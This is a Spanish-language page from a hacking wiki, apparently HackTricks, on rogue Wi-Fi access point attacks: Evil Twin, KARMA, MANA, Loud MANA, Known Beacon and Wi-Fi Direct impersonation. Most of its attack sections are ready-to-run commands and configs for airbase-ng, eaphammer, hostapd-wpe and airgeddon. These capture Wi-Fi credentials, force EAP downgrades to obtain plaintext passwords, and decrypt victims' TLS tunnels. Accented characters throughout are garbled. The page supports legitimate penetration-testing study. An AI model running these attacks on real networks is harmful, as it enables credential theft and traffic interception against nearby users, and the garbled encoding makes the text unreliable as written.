Aunque el protocolo 802.11 tiene reglas muy espec√≠ficas que dictan c√≥mo una estaci√≥n puede unirse a un ESS, no especifica c√≥mo la estaci√≥n debe seleccionar un ESS para conectarse. Adem√°s, el protocolo permite que las estaciones se desplacen libremente entre puntos de acceso que comparten el mismo ESSID (porque no querr√≠as perder la conectividad WiFi al caminar de un extremo a otro de un edificio, etc). Sin embargo, el protocolo 802.11 no especifica c√≥mo se deben seleccionar estos puntos de acceso. Adem√°s, aunque las estaciones deben estar autenticadas al ESS para asociarse con un punto de acceso, el protocolo 802.11 no requiere que el punto de acceso est√© autenticado a la estaci√≥n.

### Listas de Redes Preferidas (PNLs)

Cada vez que una estaci√≥n se conecta a una red inal√°mbrica, el ESSID de la red se almacena en la Lista de Redes Preferidas (PNL) de la estaci√≥n. La PNL es una lista ordenada de todas las redes a las que la estaci√≥n se ha conectado en el pasado, y cada entrada en la PNL contiene el ESSID de la red y cualquier informaci√≥n de configuraci√≥n espec√≠fica de la red necesaria para establecer una conexi√≥n.

### Escaneo Pasivo

En redes de infraestructura, los puntos de acceso transmiten peri√≥dicamente tramas de baliza para anunciar su presencia y capacidades a las estaciones cercanas. Las balizas son tramas de difusi√≥n, lo que significa que est√°n destinadas a ser recibidas por todas las estaciones cercanas dentro del alcance. Las balizas incluyen informaci√≥n sobre las tasas soportadas por el AP, capacidades de cifrado, informaci√≥n adicional y, lo m√°s importante, las tramas de baliza contienen el ESSID del AP (siempre que la difusi√≥n del ESSID no est√© desactivada).

Durante el escaneo pasivo, el dispositivo cliente escucha las tramas de baliza de los puntos de acceso cercanos. Si el dispositivo cliente recibe una trama de baliza cuyo campo ESSID coincide con un ESSID de la PNL del cliente, el cliente se conectar√° autom√°ticamente al punto de acceso que envi√≥ la trama de baliza. Luego, supongamos que queremos dirigirnos a un dispositivo inal√°mbrico que actualmente no est√° conectado a ninguna red inal√°mbrica. Si conocemos al menos una entrada en la PNL de ese cliente, podemos forzar al cliente a conectarse con nosotros simplemente creando nuestro propio punto de acceso con el ESSID de esa entrada.

### Sondeo Activo

El segundo algoritmo de selecci√≥n de red utilizado en 802.11 se conoce como Sondeo Activo. Los dispositivos clientes que utilizan sondeo activo transmiten continuamente tramas de solicitud de sondeo para determinar qu√© AP est√°n al alcance, as√≠ como cu√°les son sus capacidades. Las solicitudes de sondeo vienen en dos formas: dirigidas y de difusi√≥n. Las solicitudes de sondeo dirigidas est√°n dirigidas a un ESSID espec√≠fico y son la forma en que el cliente verifica si una red espec√≠fica est√° cerca.

Los clientes que utilizan sondeo dirigido enviar√°n solicitudes de sondeo para cada red en su PNL. Cabe se√±alar que el sondeo dirigido es la √∫nica forma de identificar la presencia de redes ocultas cercanas. Las solicitudes de sondeo de difusi√≥n funcionan casi exactamente de la misma manera, pero se env√≠an con el campo SSID establecido en NULL. Esto dirige la solicitud de sondeo de difusi√≥n a todos los puntos de acceso cercanos, permitiendo que la estaci√≥n verifique si alguna de sus redes preferidas est√° cerca sin revelar el contenido de su PNL.

## AP Simple con redirecci√≥n a Internet

Antes de explicar c√≥mo realizar ataques m√°s complejos, se explicar√° **c√≥mo** simplemente **crear** un **AP** y **redirigir** su **tr√°fico** a una interfaz conectada **a** la **Internet**.

Usando `ifconfig -a` verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet est√©n presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
crear un archivo de configuraci√≥n _/etc/dnsmasq.conf_ de la siguiente manera:
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Entonces **establece IPs** y **rutas**:
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Y luego **inicia** dnsmasq:
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```
apt-get install hostapd
```
Crear un archivo de configuraci√≥n _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detener procesos molestos**, establecer **modo monitor** e **iniciar hostapd**:
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenv√≠o y Redirecci√≥n
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque Evil Twin es un tipo de ataque Wi-Fi que se aprovecha del hecho de que la mayor√≠a de las computadoras y tel√©fonos solo ver√°n el "nombre" o ESSID de una red inal√°mbrica (ya que la estaci√≥n base no est√° obligada a autenticarse contra el cliente). Esto hace que sea muy dif√≠cil distinguir entre redes con el mismo nombre y el mismo tipo de cifrado. De hecho, muchas redes tendr√°n varios puntos de acceso que extienden la red, todos usando el mismo nombre para expandir el acceso sin confundir a los usuarios.

Debido a c√≥mo funciona la implementaci√≥n de los clientes (recuerda que el protocolo 802.11 permite que las estaciones se muevan libremente entre puntos de acceso dentro del mismo ESS), es posible hacer que un dispositivo cambie la estaci√≥n base a la que est√° conectado. Es posible hacerlo ofreciendo una mejor se√±al (lo cual no siempre es posible) o bloqueando el acceso a la estaci√≥n base original (paquetes de desautenticaci√≥n, interferencias o alguna otra forma de ataque DoS).

Tambi√©n ten en cuenta que las implementaciones inal√°mbricas en el mundo real suelen tener m√°s de un punto de acceso, y estos puntos de acceso a menudo son m√°s potentes y tienen un mejor alcance de l√≠nea de vista debido a su colocaci√≥n hacia el techo. Desautenticar un solo punto de acceso generalmente resulta en que el objetivo se mueva hacia otro punto de acceso v√°lido en lugar de tu AP falso, a menos que todos los puntos de acceso cercanos sean desautenticados (ruidoso) o seas muy cuidadoso con la colocaci√≥n del AP falso (dif√≠cil).

Puedes crear un Evil Twin Abierto muy b√°sico (sin capacidad para enrutar tr√°fico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Tambi√©n podr√≠as crear un Gemelo Maligno utilizando **eaphammer** (ten en cuenta que para crear gemelos malignos con eaphammer la interfaz **NO debe estar** en modo **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O utilizando Airgeddon: `Opciones: 5,6,7,8,9 (dentro del men√∫ de ataque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Por favor, ten en cuenta que por defecto si un ESSID en la PNL est√° guardado como protegido con WPA, el dispositivo no se conectar√° autom√°ticamente a un Evil Twin abierto. Puedes intentar hacer DoS al AP real y esperar que el usuario se conecte manualmente a tu Evil Twin abierto, o podr√≠as hacer DoS al AP real y usar un WPA Evil Twin para capturar el handshake (usando este m√©todo no podr√°s permitir que la v√≠ctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar descifrarlo).

_Algunos sistemas operativos y antivirus advertir√°n al usuario que conectarse a una red abierta es peligroso..._

### WPA/WPA2 Evil Twin

Puedes crear un **Evil Twin usando WPA/2** y si los dispositivos est√°n configurados para conectarse a ese SSID con WPA/2, intentar√°n conectarse. De todos modos, **para completar el 4-way-handshake** tambi√©n necesitas **conocer** la **contrase√±a** que el cliente va a usar. Si **no la conoces**, la **conexi√≥n no se completar√°**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender estos ataques, recomendar√≠a leer primero la breve [explicaci√≥n de WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuraci√≥n** para funcionar. Para **automatizar** la generaci√≥n de estas configuraciones podr√≠as usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe/_)
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuraci√≥n puedes seleccionar muchas cosas diferentes como ssid, canal, archivos de usuario, cret/key, par√°metros dh, versi√≥n wpa y autenticaci√≥n...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesi√≥n.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer utiliza estos m√©todos de autenticaci√≥n (observe GTC como el primero en intentar obtener contrase√±as en texto plano y luego el uso de m√©todos de autenticaci√≥n m√°s robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodolog√≠a predeterminada para evitar tiempos de conexi√≥n prolongados. Sin embargo, tambi√©n puedes especificar al servidor los m√©todos de autenticaci√≥n de m√°s d√©bil a m√°s fuerte:
```
--negotiate weakest
```
O tambi√©n podr√≠as usar:

* `--negotiate gtc-downgrade` para usar la implementaci√≥n de degradaci√≥n GTC altamente eficiente (contrase√±as en texto plano)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente los m√©todos ofrecidos (ofreciendo los mismos m√©todos de autenticaci√≥n en el mismo orden que la organizaci√≥n el ataque ser√° mucho m√°s dif√≠cil de detectar).
* [Encuentra m√°s informaci√≥n en la wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` puede usar certificados previamente generados para ofrecer autenticaci√≥n EAP a redes WPA/WPA2-Enterprise. La red falsa degradar√° el protocolo de conexi√≥n a EAP-MD5 para poder **capturar el usuario y el MD5 de la contrase√±a**. Luego, el atacante puede intentar descifrar la contrase√±a.\
`Airggedon` te ofrece la posibilidad de un ataque **Evil Twin continuo (ruidoso)** o **solo crear el ataque Evil Twin hasta que alguien se conecte (suave).**

![](<../../.gitbook/assets/image (129).png>)

### Depuraci√≥n de t√∫neles TLS PEAP y EAP-TTLS en ataques Evil Twins

_Este m√©todo fue probado en una conexi√≥n PEAP pero como estoy descifrando un t√∫nel TLS arbitrario esto tambi√©n deber√≠a funcionar con EAP-TTLS_

Dentro de la **configuraci√≥n** de _hostapd-wpe_ **comenta** la l√≠nea que contiene _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` a `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto har√° que `hostapd-wpe` **intercambie claves usando RSA** en lugar de DH, para que puedas **descifrar** el tr√°fico m√°s tarde **conociendo la clave privada del servidor**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuraci√≥n modificada como de costumbre. Adem√°s, inicia **`wireshark`** en la **interfaz** que est√° realizando el ataque Evil Twin.

Ahora o m√°s tarde (cuando ya hayas capturado algunos intentos de autenticaci√≥n) puedes agregar la clave privada RSA a wireshark en: `Editar --> Preferencias --> Protocolos --> TLS --> (lista de claves RSA) Editar...`

Agrega una nueva entrada y completa el formulario con estos valores: **Direcci√≥n IP = cualquier** -- **Puerto = 0** -- **Protocolo = data** -- **Archivo de clave** (**selecciona tu archivo de clave**, para evitar problemas selecciona un archivo de clave **sin protecci√≥n por contrase√±a**).

![](<../../.gitbook/assets/image (151).png>)

Y mira la nueva pesta√±a **"TLS descifrado"**:

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Loud MANA y ataque de balizas conocidas

### Listas negras/blancas de ESSID y MAC

La siguiente tabla enumera los diferentes tipos de MFACLs (Listas de Control de Acceso de Tramas de Gesti√≥n) disponibles, as√≠ como sus efectos cuando se utilizan:

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Los ataques KARMA son una segunda forma de ataque de punto de acceso falso que explota el proceso de selecci√≥n de red utilizado por las estaciones. En un documento t√©cnico escrito en 2005, Dino Dai Zovi y Shane Macaulay describen c√≥mo un atacante puede configurar un punto de acceso para escuchar solicitudes de sondeo dirigidas y responder a todas ellas con respuestas de sondeo dirigidas coincidentes. Esto provoca que las estaciones afectadas env√≠en autom√°ticamente una solicitud de asociaci√≥n al punto de acceso del atacante. El punto de acceso luego responde con una respuesta de asociaci√≥n, provocando que las estaciones afectadas se conecten al punto de acceso del atacante.

### MANA

Seg√∫n Ian de Villiers y Dominic White, las estaciones modernas est√°n dise√±adas para protegerse contra ataques KARMA ignorando las respuestas de sondeo dirigidas de puntos de acceso que no hayan respondido al menos a una solicitud de sondeo de difusi√≥n. Esto llev√≥ a una disminuci√≥n significativa en el n√∫mero de estaciones que eran vulnerables a ataques KARMA hasta 2015, cuando White y de Villiers desarrollaron un medio para eludir dichas protecciones. En el ataque KARMA mejorado de White y de Villiers (ataque MANA), se utilizan respuestas de sondeo dirigidas para reconstruir las PNL de las estaciones cercanas. Cuando se recibe una solicitud de sondeo de difusi√≥n de una estaci√≥n, el punto de acceso del atacante responde con un SSID arbitrario de la PNL de la estaci√≥n que ya se vio en un sondeo directo de ese dispositivo.

En resumen, el algoritmo MANA funciona as√≠: cada vez que el punto de acceso recibe una solicitud de sondeo, primero determina si es una solicitud de sondeo de difusi√≥n o dirigida. Si es dirigida, la direcci√≥n MAC del remitente se agrega a la tabla hash (si a√∫n no est√° all√≠) y el ESSID se agrega a la PNL de ese dispositivo. El AP luego responde con una respuesta de sondeo dirigida. Si es una solicitud de sondeo de difusi√≥n, el punto de acceso responde con respuestas de sondeo para cada una de las redes en la PNL de ese dispositivo.

Ataque MANA utilizando eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Tenga en cuenta que el ataque MANA est√°ndar a√∫n no nos permite atacar dispositivos que no utilizan sondeo dirigido en absoluto. Entonces, si tampoco conocemos previamente ninguna entrada dentro de la PNL del dispositivo, necesitamos encontrar alguna otra forma de atacarlo.

Una posibilidad es lo que se llama ataque Loud MANA. Este ataque se basa en la idea de que los dispositivos cliente que se encuentran en proximidad f√≠sica cercana entre s√≠ probablemente tengan al menos algunas entradas comunes en sus PNLs.

En resumen, el ataque Loud MANA en lugar de responder a las solicitudes de sondeo con cada ESSID en la PNL de un dispositivo en particular, el AP malicioso env√≠a respuestas de sondeo para cada ESSID en todas las PNLs de todos los dispositivos que ha visto antes. Relacionando esto con la teor√≠a de conjuntos, podemos decir que el AP env√≠a respuestas de sondeo para cada ESSID en la uni√≥n de todas las PNLs de los dispositivos cercanos.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Known Beacon

A√∫n hay casos en los que el ataque Loud MANA no tendr√° √©xito.\
El ataque Known Beacon es una forma de "Fuerza Bruta" para intentar que la v√≠ctima se conecte con el atacante. El atacante crea un AP que responde a cualquier ESSID y ejecuta c√≥digo enviando beacons que fingen ESSIDs de cada nombre dentro de una lista de palabras. Con suerte, la v√≠ctima contendr√° algunos de estos nombres de ESSID dentro de su PNL e intentar√° conectarse al AP falso.\
Eaphammer implement√≥ este ataque como un ataque MANA donde todos los ESSIDs dentro de una lista se cargan (tambi√©n podr√≠as combinar esto con `--loud` para crear un ataque Loud MANA + Known beacons):
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque Known Beacon Burst**

Como es sabido, los beacons son ruidosos. Puedes usar un script dentro del proyecto Eaphammer para lanzar beacons de cada nombre de ESSID dentro de un archivo muy r√°pidamente. Si combinas este script con un ataque MANA de Eaphammer, los clientes podr√°n conectarse a tu AP.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct es un est√°ndar de Wi-Fi que permite a los dispositivos conectarse entre s√≠ sin un AP inal√°mbrico, ya que uno de los dos dispositivos actuar√° como AP (llamado propietario del grupo). Puedes encontrar Wi-Fi Direct en muchos dispositivos IoT como impresoras, televisores...

Wi-Fi Direct depende de Wi-Fi Protected Setup (**WPS**) para conectar los dispositivos de manera segura. WPS tiene m√∫ltiples m√©todos de configuraci√≥n como Configuraci√≥n de **Push-Button** (PBC), entrada de **PIN** y Comunicaci√≥n de **Campo Cercano** (NFC)

Por lo tanto, los ataques previamente vistos a WPS PIN tambi√©n son v√°lidos aqu√≠ si se utiliza PIN.

### Secuestro de EvilDirect

Esto funciona como un Evil-Twin pero para Wi-Fi direct, puedes suplantar a un propietario de grupo para intentar que otros dispositivos como tel√©fonos se conecten a ti: `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## Referencias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: Echa un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitaci√≥n de WPA en captive portals)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Hacking Insights**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking.

**Real-Time Hack News**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e insights en tiempo real.

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cruciales de la plataforma.

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo.

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
